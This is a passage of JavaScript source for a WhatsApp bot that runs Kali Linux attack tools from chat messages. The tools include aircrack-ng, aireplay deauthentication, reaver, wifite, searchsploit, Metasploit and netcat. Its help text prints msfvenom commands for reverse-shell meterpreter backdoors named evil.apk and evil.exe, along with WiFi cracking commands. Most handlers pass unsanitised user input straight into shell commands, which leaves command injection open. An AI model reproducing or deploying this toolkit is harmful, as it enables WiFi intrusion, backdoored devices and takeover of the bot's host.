        ``,
        `◈ ${p()}airodump wlan0mon                   — scan all networks`,
        `◈ ${p()}airodump -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon`,
        `◈ ${p()}airodump --band abg wlan0mon         — 2.4GHz + 5GHz`,
        ``,
        `_Put adapter in monitor mode first: ${p()}airmon wlan0 start_`,
    ], msg)
    await fmt.react(sock, msg, '📡')
    await ensureTool(sock, from, 'airodump-ng', 'aircrack-ng', msg)
    const t = Date.now()
    const r = await kali(`timeout 30 airodump-ng ${q} 2>&1 || airodump-ng ${q} 2>&1`, Math.min(T_MED, 35000))
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📡 AIRODUMP-NG [${elapsed(t)}]`, r.out, msg)
}

async function handleAireplay(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💥 AIREPLAY-NG — Packet Injection', [
        `*Usage:* ${p()}aireplay [options] <interface>`,
        ``,
        `*Deauthentication attack:*`,
        `◈ ${p()}aireplay -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon`,
        `◈ ${p()}aireplay -0 0 -a AP_MAC -c CLIENT_MAC wlan0mon   — target specific client`,
        ``,
        `*Fake auth:*`,
        `◈ ${p()}aireplay -1 0 -a AP_MAC wlan0mon`,
        ``,
        `*ARP replay:*`,
        `◈ ${p()}aireplay -3 -b AP_MAC wlan0mon`,
    ], msg)
    await fmt.react(sock, msg, '💥')
    await ensureTool(sock, from, 'aireplay-ng', 'aircrack-ng', msg)
    const t = Date.now()
    const r = await kali(`aireplay-ng ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💥 AIREPLAY-NG [${elapsed(t)}]`, r.out, msg)
}

async function handleAircrack(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔓 AIRCRACK-NG — WiFi Key Cracker', [
        `*Usage:* ${p()}aircrack [options] <capture.cap>`,
        ``,
        `*WPA2 crack with wordlist:*`,
        `◈ ${p()}aircrack -w /usr/share/wordlists/rockyou.txt -b AP_BSSID capture.cap`,
        ``,
        `*WEP crack:*`,
        `◈ ${p()}aircrack capture.cap`,
        ``,
        `*Check capture for handshakes:*`,
        `◈ ${p()}aircrack capture.cap`,
        ``,
        `_Capture file created by airodump-ng_`,
    ], msg)
    await fmt.react(sock, msg, '🔓')
    await ensureTool(sock, from, 'aircrack-ng', 'aircrack-ng', msg)
    const t = Date.now()
    const r = await kali(`aircrack-ng ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔓 AIRCRACK-NG [${elapsed(t)}]`, r.out, msg)
}

async function handleWifite(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📶 WIFITE — Automated WiFi Auditor', [
        `*Usage:* ${p()}wifite [options]`,
        ``,
        `◈ ${p()}wifite --wpa                    — attack WPA networks only`,
        `◈ ${p()}wifite --wep                    — attack WEP networks only`,
        `◈ ${p()}wifite -i wlan0 --kill          — kill conflicting processes`,
        `◈ ${p()}wifite --dict /usr/share/wordlists/rockyou.txt`,
        `◈ ${p()}wifite --bssid AA:BB:CC:DD:EE:FF — target specific AP`,
        ``,
        `_Fully automated — handles monitor mode, capture, crack_`,
    ], msg)
    await fmt.react(sock, msg, '📶')
    await ensureTool(sock, from, 'wifite', 'wifite', msg)
    const t = Date.now()
    const r = await kali(`wifite ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📶 WIFITE [${elapsed(t)}]`, r.out, msg)
}

async function handleReaver(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔓 REAVER — WPS Brute-Force', [
        `*Usage:* ${p()}reaver [options]`,
        ``,
        `◈ ${p()}reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv`,
        `◈ ${p()}reaver -i wlan0mon -b AP_BSSID -vv -N`,
        `◈ ${p()}reaver -i wlan0mon -b AP_BSSID -p 12345670    — known PIN`,
        `◈ ${p()}reaver -i wlan0mon -b AP_BSSID --no-nacks`,
        ``,
        `_Put adapter in monitor mode first: ${p()}airmon wlan0 start_`,
        `_Targets WPS-enabled routers_`,
    ], msg)
    await fmt.react(sock, msg, '🔓')
    await ensureTool(sock, from, 'reaver', 'reaver', msg)
    const t = Date.now()
    const r = await kali(`reaver ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔓 REAVER [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  EXPLOITATION
// ════════════════════════════════════════════════════════════════════════════════

async function handleSearchsploit(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💣 SEARCHSPLOIT — ExploitDB Search', [
        `*Usage:* ${p()}searchsploit <search term>`,
        ``,
        `◈ ${p()}searchsploit apache 2.4`,
        `◈ ${p()}searchsploit wordpress 5.0`,
        `◈ ${p()}searchsploit openssh 7`,
        `◈ ${p()}searchsploit "windows smb"`,
        `◈ ${p()}searchsploit -t wordpress         — title only search`,
        `◈ ${p()}searchsploit -x 12345             — examine exploit #12345`,
        ``,
        `_Searches ExploitDB offline database of known exploits_`,
    ], msg)
    await fmt.react(sock, msg, '💣')
    await ensureTool(sock, from, 'searchsploit', 'exploitdb', msg)
    const t = Date.now()
    const r = await kali(`searchsploit --color=false ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💣 SEARCHSPLOIT: ${q} [${elapsed(t)}]`, r.out || '(no results)', msg)
}

async function handleMsfvenom(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🧬 MSFVENOM — Payload Generator', [
        `*Usage:* ${p()}msfvenom [options]`,
        ``,
        `*List all payloads:*`,
        `◈ ${p()}msfvenom -l payloads`,
        ``,
        `*Android APK backdoor:*`,
        `◈ ${p()}msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -o /tmp/evil.apk`,
        ``,
        `*Windows EXE:*`,
        `◈ ${p()}msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o /tmp/evil.exe`,
        ``,
        `*Linux ELF:*`,
        `◈ ${p()}msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o /tmp/evil`,
        ``,
        `*List formats:* ${p()}msfvenom -l formats`,
    ], msg)
    await fmt.react(sock, msg, '🧬')
    await ensureTool(sock, from, 'msfvenom', 'metasploit-framework', msg)
    const t = Date.now()
    const r = await kali(`msfvenom ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🧬 MSFVENOM [${elapsed(t)}]`, r.out, msg)
}

async function handleMsf(sock, from, q, msg) {
    if (!q) return tip(sock, from, '💣 MSF — Metasploit Command Runner', [
        `*Usage:* ${p()}msf <command>`,
        ``,
        `_Runs a single Metasploit command and returns output._`,
        ``,
        `◈ ${p()}msf version`,
        `◈ ${p()}msf search type:exploit name:smb`,
        `◈ ${p()}msf info exploit/windows/smb/ms17_010_eternalblue`,
        `◈ ${p()}msf search cve:2021`,
        ``,
        `_Interactive msfconsole is not supported via bot._`,
        `_Use this for searches and info lookups._`,
    ], msg)
    await fmt.react(sock, msg, '💣')
    await ensureTool(sock, from, 'msfconsole', 'metasploit-framework', msg)
    await tip(sock, from, '💣 MSF RUNNING', [`_Launching Metasploit... may take 30-60s_`], msg)
    const t = Date.now()
    const r = await kali(`msfconsole -q -x "${q.replace(/"/g, '\\"')}; exit" 2>&1`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `💣 MSF [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  FORENSICS
// ════════════════════════════════════════════════════════════════════════════════

async function handleBinwalk(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔬 BINWALK — Firmware & Binary Analysis', [
        `*Usage:* ${p()}binwalk [options] <file>`,
        ``,
        `◈ ${p()}binwalk /tmp/firmware.bin              — scan for embedded files`,
        `◈ ${p()}binwalk -e /tmp/firmware.bin            — extract embedded files`,
        `◈ ${p()}binwalk -Me /tmp/firmware.bin           — recursive extract`,
        `◈ ${p()}binwalk -A /tmp/binary                 — scan for CPU instructions`,
        `◈ ${p()}binwalk -B /tmp/binary                 — scan for known signatures`,
        ``,
        `_Great for analyzing firmware and binary blobs_`,
    ], msg)
    await fmt.react(sock, msg, '🔬')
    await ensureTool(sock, from, 'binwalk', 'binwalk', msg)
    const t = Date.now()
    const r = await kali(`binwalk ${q}`, T_MED)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔬 BINWALK [${elapsed(t)}]`, r.out, msg)
}

async function handleStrings(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📝 STRINGS — Extract Text from Binary', [
        `*Usage:* ${p()}strings [options] <file>`,
        ``,
        `◈ ${p()}strings /tmp/binary`,
        `◈ ${p()}strings -n 8 /tmp/binary              — min length 8 chars`,
        `◈ ${p()}strings /tmp/binary | grep -i password`,
        `◈ ${p()}strings /tmp/binary | grep -i "http"`,
        `◈ ${p()}strings /tmp/binary | head -100`,
        ``,
        `_Extracts all readable ASCII/Unicode strings_`,
    ], msg)
    await fmt.react(sock, msg, '📝')
    const t = Date.now()
    const r = await kali(`strings ${q} | head -200`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📝 STRINGS [${elapsed(t)}]`, r.out, msg)
}

async function handleExiftool(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📷 EXIFTOOL — File Metadata Extractor', [
        `*Usage:* ${p()}exiftool <file>`,
        ``,
        `◈ ${p()}exiftool /tmp/photo.jpg`,
        `◈ ${p()}exiftool /tmp/document.pdf`,
        `◈ ${p()}exiftool /tmp/video.mp4`,
        ``,
        `_Shows: GPS location, camera model, timestamps,`,
        `author, software used, and 200+ other metadata fields_`,
    ], msg)
    await fmt.react(sock, msg, '📷')
    await ensureTool(sock, from, 'exiftool', 'libimage-exiftool-perl', msg)
    const t = Date.now()
    const r = await kali(`exiftool ${q}`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📷 EXIFTOOL [${elapsed(t)}]`, r.out, msg)
}

async function handleSteghide(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🖼️ STEGHIDE — Steganography Tool', [
        `*Usage:* ${p()}steghide <command> [options]`,
        ``,
        `*Embed a secret file:*`,
        `◈ ${p()}steghide embed -cf image.jpg -sf secret.txt`,
        `◈ ${p()}steghide embed -cf image.jpg -sf secret.txt -p "password"`,
        ``,
        `*Extract hidden data:*`,
        `◈ ${p()}steghide extract -sf image.jpg`,
        `◈ ${p()}steghide extract -sf image.jpg -p "password"`,
        ``,
        `*Check image info:*`,
        `◈ ${p()}steghide info image.jpg`,
    ], msg)
    await fmt.react(sock, msg, '🖼️')
    await ensureTool(sock, from, 'steghide', 'steghide', msg)
    const t = Date.now()
    const r = await kali(`steghide ${q}`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🖼️ STEGHIDE [${elapsed(t)}]`, r.out, msg)
}

async function handleForemost(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🗂️ FOREMOST — File Carving & Recovery', [
        `*Usage:* ${p()}foremost [options]`,
        ``,
        `◈ ${p()}foremost -i /tmp/disk.img -o /tmp/recovered`,
        `◈ ${p()}foremost -t jpg,png,pdf -i /tmp/disk.img -o /tmp/out`,
        `◈ ${p()}foremost -i /dev/sdb -o /tmp/recovered`,
        ``,
        `_Recovers deleted files: jpg, png, gif, bmp, avi, mp4, pdf, doc, zip_`,
    ], msg)
    await fmt.react(sock, msg, '🗂️')
    await ensureTool(sock, from, 'foremost', 'foremost', msg)
    const t = Date.now()
    const r = await kali(`foremost ${q}`, T_LONG)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🗂️ FOREMOST [${elapsed(t)}]`, r.out, msg)
}

async function handleHexdump(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔢 HEXDUMP — Hex File Viewer', [
        `*Usage:* ${p()}hexdump [options] <file>`,
        ``,
        `◈ ${p()}hexdump /tmp/file.bin              — hex + ASCII`,
        `◈ ${p()}hexdump -C /tmp/file.bin            — canonical hex+ASCII`,
        `◈ ${p()}hexdump -C /tmp/file.bin | head -30`,
        `◈ ${p()}hexdump -n 256 /tmp/file.bin        — first 256 bytes only`,
    ], msg)
    await fmt.react(sock, msg, '🔢')
    const t = Date.now()
    const r = await kali(`hexdump -C ${q} 2>&1 | head -100`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔢 HEXDUMP [${elapsed(t)}]`, r.out, msg)
}

async function handleXxd(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔢 XXD — Hex Dump Tool', [
        `*Usage:* ${p()}xxd [options] <file>`,
        ``,
        `◈ ${p()}xxd /tmp/file.bin`,
        `◈ ${p()}xxd -l 256 /tmp/file.bin            — first 256 bytes`,
        `◈ ${p()}xxd -r /tmp/hex.txt /tmp/binary      — reverse: hex → binary`,
        `◈ ${p()}xxd /tmp/file | grep "4d5a"          — find MZ header (exe)`,
    ], msg)
    await fmt.react(sock, msg, '🔢')
    const t = Date.now()
    const r = await kali(`xxd ${q} 2>&1 | head -100`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔢 XXD [${elapsed(t)}]`, r.out, msg)
}

async function handleFile(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📋 FILE — File Type Identifier', [
        `*Usage:* ${p()}file <file>`,
        ``,
        `◈ ${p()}file /tmp/mystery`,
        `◈ ${p()}file /tmp/*.bin`,
        `◈ ${p()}file -i /tmp/image.jpg              — MIME type`,
    ], msg)
    await fmt.react(sock, msg, '📋')
    const t = Date.now()
    const r = await kali(`file ${q}`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📋 FILE [${elapsed(t)}]`, r.out, msg)
}

async function handleMd5sum(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔑 MD5SUM — MD5 Checksum', [
        `*Usage:* ${p()}md5sum <file>`,
        `◈ ${p()}md5sum /tmp/file.zip`,
        `◈ ${p()}md5sum /tmp/*.apk`,
    ], msg)
    await fmt.react(sock, msg, '🔑')
    const t = Date.now()
    const r = await kali(`md5sum ${q}`, T_QUICK)
    await reply(sock, from, `🔑 MD5SUM [${elapsed(t)}]`, r.out, msg)
}

async function handleSha256sum(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔑 SHA256SUM — SHA-256 Checksum', [
        `*Usage:* ${p()}sha256sum <file>`,
        `◈ ${p()}sha256sum /tmp/file.zip`,
        `◈ ${p()}sha256sum /tmp/*.apk`,
    ], msg)
    await fmt.react(sock, msg, '🔑')
    const t = Date.now()
    const r = await kali(`sha256sum ${q}`, T_QUICK)
    await reply(sock, from, `🔑 SHA256SUM [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  NETWORK TOOLS (via Kali)
// ════════════════════════════════════════════════════════════════════════════════

async function handleNc(sock, from, q, msg) {
    if (!q) return tip(sock, from, '🔌 NETCAT (nc) — Network Utility', [
        `*Usage:* ${p()}nc [options] <host> <port>`,
        ``,
        `*Port check:*`,
        `◈ ${p()}nc -zv 192.168.1.1 22             — check if SSH open`,
        `◈ ${p()}nc -zv 192.168.1.1 1-1000         — scan ports 1-1000`,
        ``,
        `*Banner grab:*`,
        `◈ ${p()}nc -w 3 example.com 80             — grab HTTP banner`,
        `◈ ${p()}nc -w 3 example.com 22             — grab SSH banner`,
        ``,
        `*Listen for connection:*`,
        `◈ ${p()}nc -lvnp 4444                      — listen on port 4444`,
    ], msg)
    await fmt.react(sock, msg, '🔌')
    await ensureTool(sock, from, 'nc', 'netcat-openbsd', msg)
    const t = Date.now()
    const r = await kali(`timeout 15 nc ${q} 2>&1 || echo "Connection timed out or refused"`, T_QUICK)
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `🔌 NETCAT [${elapsed(t)}]`, r.out, msg)
}

async function handleTcpdump(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📡 TCPDUMP — Packet Capture', [
        `*Usage:* ${p()}tcpdump [options]`,
        ``,
        `◈ ${p()}tcpdump -i wlan0 -c 50            — capture 50 packets on wlan0`,
        `◈ ${p()}tcpdump -i eth0 port 80 -c 20     — HTTP traffic only`,
        `◈ ${p()}tcpdump -i any -c 30 -n           — all interfaces, no DNS resolve`,
        `◈ ${p()}tcpdump -i wlan0 -c 100 -w /tmp/capture.pcap  — save to file`,
        `◈ ${p()}tcpdump -r /tmp/capture.pcap      — read saved capture`,
    ], msg)
    await fmt.react(sock, msg, '📡')
    await ensureTool(sock, from, 'tcpdump', 'tcpdump', msg)
    const t = Date.now()
    const r = await kali(`timeout 20 tcpdump ${q} 2>&1`, Math.min(T_MED, 25000))
    await fmt.react(sock, msg, '✅')
    await reply(sock, from, `📡 TCPDUMP [${elapsed(t)}]`, r.out, msg)
}

// ════════════════════════════════════════════════════════════════════════════════
//  .kinstall — Install any Kali tool directly from WhatsApp
// ════════════════════════════════════════════════════════════════════════════════
//
//  Usage:  .kinstall <package>
//  Also:   .kinstall update     — apt-get update
//          .kinstall upgrade    — apt-get upgrade -y
//          .kinstall search <q> — search Kali repos

// Only allow valid Debian/APT package name characters — blocks all shell injection
function sanitizePkg(name) {
    // Debian package names: lowercase letters, digits, hyphens, dots, plus signs
    return name.replace(/[^a-zA-Z0-9.\-+_]/g, '').slice(0, 80)
}

async function handleKaliInstall(sock, from, q, msg) {
    if (!q) return tip(sock, from, '📦 KINSTALL — Install Kali Tools', [
        `*Usage:* ${p()}kinstall <package>`,
        ``,
        `*Examples:*`,
        `◈ ${p()}kinstall nmap             — install nmap`,
        `◈ ${p()}kinstall sqlmap           — install sqlmap`,
        `◈ ${p()}kinstall metasploit-framework`,
        `◈ ${p()}kinstall wordlists        — Kali wordlists`,
        `◈ ${p()}kinstall aircrack-ng      — WiFi suite`,
        `◈ ${p()}kinstall update           — update package lists`,
        `◈ ${p()}kinstall upgrade          — upgrade all packages`,
        `◈ ${p()}kinstall search <query>   — search for a package`,
        ``,
        `_All installs run in your Kali proot container._`,
        `_Large packages (metasploit, wordlists) may take a few minutes._`,
    ], msg)

    const parts = q.trim().split(/\s+/)
    const sub   = parts[0].toLowerCase()

    // Special sub-commands
    if (sub === 'update') {
        await fmt.react(sock, msg, '⏳')
        await sock.sendMessage(from, { text: fmt.box('🔄 KALI UPDATE', ['_Updating package lists..._']) }, { quoted: msg })
        const t = Date.now()
        const r = await kali('apt-get update 2>&1', T_LONG)
        await fmt.react(sock, msg, '✅')
        return reply(sock, from, `🔄 KALI UPDATE [${elapsed(t)}]`, r.out, msg)
    }

    if (sub === 'upgrade') {
        await fmt.react(sock, msg, '⏳')
        await sock.sendMessage(from, { text: fmt.box('⬆️ KALI UPGRADE', ['_Upgrading all installed packages..._', '_This may take a few minutes._']) }, { quoted: msg })
        const t = Date.now()
        const r = await kali('DEBIAN_FRONTEND=noninteractive apt-get upgrade -y 2>&1', T_LONG)
        await fmt.react(sock, msg, '✅')
        return reply(sock, from, `⬆️ KALI UPGRADE [${elapsed(t)}]`, r.out, msg)
    }

    if (sub === 'search') {
        const rawQuery = parts.slice(1).join(' ')
        if (!rawQuery) return tip(sock, from, '🔍 KINSTALL SEARCH', [`*Usage:* ${p()}kinstall search <package-name>`], msg)
        const query = sanitizePkg(rawQuery)
        if (!query) return tip(sock, from, '❌ INVALID', ['Package name contains invalid characters.'], msg)
        await fmt.react(sock, msg, '⏳')
        const r = await kali(`apt-cache search ${query} 2>&1 | head -40`, T_QUICK)
        await fmt.react(sock, msg, '✅')
        return reply(sock, from, `🔍 KALI SEARCH: ${query}`, r.out || '(no results)', msg)
    }

    // Normal install — sanitize ALL package tokens
    const cleanPkgs = parts.map(sanitizePkg).filter(Boolean)
    if (!cleanPkgs.length) {
        return tip(sock, from, '❌ INVALID PACKAGE NAME', [
            'Package names can only contain letters, digits, hyphens, dots, and plus signs.',
            `Example: ${p()}kinstall nmap`,
        ], msg)
    }
    const pkg = cleanPkgs.join(' ')
    await fmt.react(sock, msg, '⏳')
    await sock.sendMessage(from, {
        text: fmt.box('📦 KALI INSTALL', [
            `Installing *${pkg}* in Kali container...`,
            `_Large packages may take 1–3 minutes._`,
        ])
    }, { quoted: msg })

    const t = Date.now()
    const r = await kali(`DEBIAN_FRONTEND=noninteractive apt-get install -y ${pkg} 2>&1`, T_LONG)
    const success = r.out.includes('newly installed') || r.out.includes('already the newest') || r.out.includes('is already installed')
    await fmt.react(sock, msg, success ? '✅' : '⚠️')
    return reply(sock, from, `📦 KALI INSTALL: ${pkg} [${elapsed(t)}]`, r.out, msg)
}

module.exports = {
    handleNmap, handleMasscan, handleNikto, handleWhatweb,
    handleGobuster, handleDirb, handleWfuzz, handleFfuf,
    handleWpscan, handleEnum4linux,
    handleHydra, handleJohn, handleHashcat, handleMedusa,
    handleCrunch, handleHashid,
    handleSqlmap,
    handleDnsrecon, handleDnsenum, handleFierce, handleSubfinder, handleAmass,
    handleSherlock, handleHarvester, handleGeoip,
    handleAirmon, handleAirodump, handleAireplay, handleAircrack,
    handleWifite, handleReaver,
    handleSearchsploit, handleMsfvenom, handleMsf,
    handleBinwalk, handleStrings, handleExiftool, handleSteghide,
    handleForemost, handleHexdump, handleXxd, handleFile,
    handleMd5sum, handleSha256sum,
    handleNc, handleTcpdump,
    handleKaliInstall,
}
